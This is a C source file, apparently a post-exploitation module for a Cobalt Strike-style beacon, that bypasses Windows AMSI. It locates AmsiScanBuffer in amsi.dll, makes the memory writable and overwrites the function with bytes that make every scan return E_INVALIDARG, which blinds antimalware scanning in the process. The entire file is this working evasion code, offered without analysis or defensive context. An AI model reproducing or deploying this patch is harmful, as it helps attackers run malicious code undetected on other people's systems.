#include <windows.h>
#include "beacon_compat.h"

/* BOF-style imports */
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);

void go(char *args, int args_len) {
    (void)args; (void)args_len;

    HMODULE hAmsi = KERNEL32$LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] amsi.dll not loaded — nothing to patch\n");
        return;
    }

    void *pFunc = (void *)KERNEL32$GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pFunc) {
        BeaconPrintf(CALLBACK_ERROR, "[!] AmsiScanBuffer not found\n");
        return;
    }

    /* x64: mov eax, 0x80070057; ret */
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD oldProtect;

    if (!KERNEL32$VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualProtect failed: %lu\n", KERNEL32$GetLastError());
        return;
    }

    memcpy(pFunc, patch, sizeof(patch));
    KERNEL32$VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI patched (AmsiScanBuffer -> E_INVALIDARG)\n");
}
